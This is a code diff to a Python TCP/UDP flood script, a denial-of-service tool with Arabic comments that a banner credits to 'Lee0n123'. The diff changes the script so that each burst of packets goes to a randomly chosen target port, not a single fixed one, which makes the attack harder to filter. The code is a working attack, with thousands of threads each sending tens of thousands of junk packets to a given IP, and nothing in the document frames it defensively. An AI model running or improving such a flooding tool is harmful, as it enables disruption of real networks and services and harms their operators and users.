@@ -7,7 +7,7 @@ import threading
 
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
-ap.add_argument("-p", "--port", type=int, default=0, help="Port (0 for random)")
+ap.add_argument("-p", "--port", type=int, default=0, help="Port (0 for random, range for random: min-max)")
 ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
 ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
 ap.add_argument("-th", "--threads", type=int, default=2000, help="Threads")
@@ -16,15 +16,13 @@ args = vars(ap.parse_args())
 print("--> C0de By Lee0n123 <--")
 print("#-- TCP/UDP FLOOD --#")
 ip = args['ip']
-port = args['port']
+port_arg = args['port']
 choice = args['choice']
 times = args['times']
 threads = args['threads']
 
-# توليد منفذ عشوائي إذا كان port = 0
-if port == 0:
-    port = random.randint(1, 65353)
-    print(f"[*] Using random port: {port}")
+# تحديد إذا كان المستخدم يريد منافذ عشوائية
+use_random_ports = (port_arg == 0)
 
 def run():
     data = random._urandom(1024)
@@ -32,10 +30,15 @@ def run():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip), int(port))
+            # اختيار منفذ عشوائي في كل مرة
+            if use_random_ports:
+                target_port = random.randint(1, 65353)
+            else:
+                target_port = port_arg
+            addr = (str(ip), target_port)
             for x in range(times):
                 s.sendto(data, addr)
-            print(i + f" Sent to port {port}!!!")
+            print(i + f" Sent to port {target_port}!!!")
         except:
             print("[!] Error!!!")
 
@@ -44,12 +47,17 @@ def run2():
     i = random.choice(("[*]","[!]","[#]"))
     while True:
         try:
+            # اختيار منفذ عشوائي في كل مرة
+            if use_random_ports:
+                target_port = random.randint(1, 65353)
+            else:
+                target_port = port_arg
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
+            s.connect((ip, target_port))
             s.send(data)
             for x in range(times):
                 s.send(data)
-            print(i + f" Sent to port {port}!!!")
+            print(i + f" Sent to port {target_port}!!!")
         except:
             s.close()
             print("[*] Error")
